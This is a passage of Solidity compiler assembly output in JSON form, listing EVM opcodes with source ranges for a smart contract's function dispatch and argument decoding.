											"begin": 3108,
											"end": 3469,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "ADD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "PUSH [tag]",
											"value": "67"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "tag",
											"value": "11"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMPDEST"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "PUSH [tag]",
											"value": "69"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "tag",
											"value": "12"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMPDEST"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH [tag]",
											"value": "70"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH [tag]",
											"value": "71"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "tag",
											"value": "70"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMPDEST"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "MLOAD"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP3"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "AND"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP3"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "MSTORE"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "MLOAD"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP2"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SUB"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "ADD"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "SWAP1"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "RETURN"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "tag",
											"value": "13"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMPDEST"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "PUSH [tag]",
											"value": "73"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "tag",
											"value": "14"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMPDEST"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "DUP1"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "75"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "75"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "AND"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH [tag]",
											"value": "76"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "tag",
											"value": "15"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "JUMPDEST"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "PUSH [tag]",
											"value": "78"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "tag",
											"value": "16"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "JUMPDEST"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "PUSH [tag]",
											"value": "80"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "tag",
											"value": "17"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "JUMPDEST"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "DUP1"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "82"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "82"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "AND"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "PUSH [tag]",
											"value": "83"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "tag",
											"value": "18"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMPDEST"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "DUP1"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "85"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "85"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "AND"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "PUSH [tag]",
											"value": "86"
										},
										{
											"begin": 339,
											"end": 383,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "tag",
											"value": "19"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "JUMPDEST"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "PUSH [tag]",
											"value": "88"
										},
										{
											"begin": 1010,
											"end": 1027,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "tag",
											"value": "20"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMPDEST"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "DUP1"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "90"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "90"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "AND"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "PUSH [tag]",
											"value": "91"
										},
										{
											"begin": 778,
											"end": 819,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "tag",
											"value": "21"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "JUMPDEST"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "PUSH [tag]",
											"value": "92"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "DUP1"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "93"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "93"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "AND"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "PUSH [tag]",
											"value": "94"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "tag",
											"value": "92"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "JUMPDEST"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "DUP1"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "MLOAD"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "SWAP3"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "DUP4"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "MSTORE"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "DUP4"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "ADD"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "SWAP2"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "SWAP1"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "SWAP2"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "MSTORE"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "DUP1"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "MLOAD"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "SWAP2"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "DUP3"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "SWAP1"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "SUB"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "ADD"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "SWAP1"
										},
										{
											"begin": 7669,
											"end": 9098,
											"name": "RETURN"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "tag",
											"value": "22"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "JUMPDEST"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "PUSH [tag]",
											"value": "96"
										},
										{
											"begin": 325,
											"end": 395,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "tag",
											"value": "23"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMPDEST"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH [tag]",
											"value": "47"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "PUSH [tag]",
											"value": "98"
										},
										{
											"begin": 220,
											"end": 260,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "tag",
											"value": "24"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "JUMPDEST"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH [tag]",
											"value": "55"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "DUP1"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "104"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "104"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "DUP2"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "AND"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "SWAP1"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "ADD"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "PUSH [tag]",
											"value": "105"
										},
										{
											"begin": 2963,
											"end": 3102,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "tag",
											"value": "25"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "JUMPDEST"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "PUSH [tag]",
											"value": "107"
										},
										{
											"begin": 402,
											"end": 450,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 17701,
											"end": 18122,
											"name": "tag",
											"value": "26"
										},
										{
											"begin": 17701,
											"end": 18122,
											"name": "JUMPDEST"
										},
										{
											"begin": 17701,
											"end": 18122,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 17701,
											"end": 18122,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 17701,
											"end": 18122,
											"name": "DUP1"
										},
										{
											"begin": 17701,
											"end": 18122,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 17701,
											"end": 18122,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "109"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
										{
											"begin": 19,
											"end": 31,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "109"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 17701,
											"end": 18122,
											"name": "CALLDATALOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 17701,
											"end": 18122,
											"name": "AND"
										},
										{
											"begin": 17701,
											"end": 18122,
											"name": "PUSH [tag]",
											"value": "110"
										},
										{
											"begin": 17701,
											"end": 18122,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "tag",
											"value": "27"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "JUMPDEST"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "PUSH [tag]",
											"value": "112"
										},
										{
											"begin": 559,
											"end": 581,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "tag",
											"value": "28"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "JUMPDEST"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "PUSH [tag]",
											"value": "58"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "PUSH [tag]",
											"value": "114"
										},
										{
											"begin": 614,
											"end": 635,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "tag",
											"value": "29"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMPDEST"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH [tag]",
											"value": "41"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 16,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 17,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "116"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "tag",
											"value": "116"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "AND"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "AND"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "60"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "FF"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "80"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP3"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "AND"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "DUP2"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "SWAP1"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH",
											"value": "C0"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "ADD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "CALLDATALOAD"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "PUSH [tag]",
											"value": "117"
										},
										{
											"begin": 3475,
											"end": 4439,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 6279,
											"end": 7560,
											"name": "tag",
											"value": "30"
										},
										{
											"begin": 6279,
											"end": 7560,
											"name": "JUMPDEST"
										},
										{
											"begin": 6279,
											"end": 7560,
											"name": "PUSH [tag]",
											"value": "63"
										},
										{
											"begin": 6279,
											"end": 7560,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 6279,
											"end": 7560,
											"name": "DUP1"
										},
										{
											"begin": 6279,
											"end": 7560,
											"name": "CALLDATASIZE"
										},
										{
											"begin": 6279,
											"end": 7560,
											"name": "SUB"
										},
										{
											"begin": 13,
											"end": 15,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 8,
											"end": 11,
											"name": "DUP2"
										},
										{
											"begin": 5,
											"end": 16,
											"name": "LT"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "ISZERO"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "PUSH [tag]",
											"value": "119"
										},
										{
											"begin": 2,
											"end": 4,
											"name": "JUMPI"
										},
										{
											"begin": 29,
											"end": 30,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 26,
											"end": 27,
											"name": "DUP1"
										},
